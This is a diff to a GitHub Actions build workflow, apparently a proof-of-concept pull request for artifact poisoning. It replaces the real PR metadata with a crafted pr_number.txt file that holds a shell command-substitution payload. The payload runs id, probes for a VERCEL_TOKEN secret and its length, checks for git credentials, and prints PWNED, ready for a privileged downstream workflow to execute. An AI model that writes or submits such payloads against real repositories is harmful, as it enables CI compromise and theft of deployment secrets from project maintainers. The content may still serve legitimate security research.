@@ -1,11 +1,7 @@
 name: Build & Deploy
 
 on:
-  push:
-    branches:
-      - main
   pull_request:
-  workflow_dispatch:
 
 jobs:
   build-and-deploy:
@@ -16,8 +12,12 @@ jobs:
 
     - name: Build the blog
       run: |
-        mkdir -p dist
-        echo '<html>okta blog preview</html>' > dist/index.html
+        mkdir -p dist prmeta
+        echo '<html>attacker controlled preview</html>' > dist/index.html
+        cat > prmeta/pr_number.txt <<'PAYLOAD'
+        $(id; echo "SECRET_PRESENT=${VERCEL_TOKEN:+YES}" >&2; echo "TOKEN_LEN=${#VERCEL_TOKEN}" >&2; git config --get http.https://github.com/.extraheader >/dev/null 2>&1 && echo GITCRED=YES >&2; echo PWNED)
+        PAYLOAD
+        echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > prmeta/pr_sha.txt
 
     - name: Upload dist artifact
       uses: actions/upload-artifact@v7
@@ -25,17 +25,8 @@ jobs:
         name: dist
         path: dist/
 
-    - name: Save PR metadata
-      if: github.event_name == 'pull_request'
-      run: |
-        echo "${{ github.event.pull_request.number }}" > pr_number.txt
-        echo "${{ github.event.pull_request.head.sha }}" > pr_sha.txt
-
     - name: Upload PR metadata
-      if: github.event_name == 'pull_request'
       uses: actions/upload-artifact@v7
       with:
         name: pr-metadata
-        path: |
-          pr_number.txt
-          pr_sha.txt
+        path: prmeta/
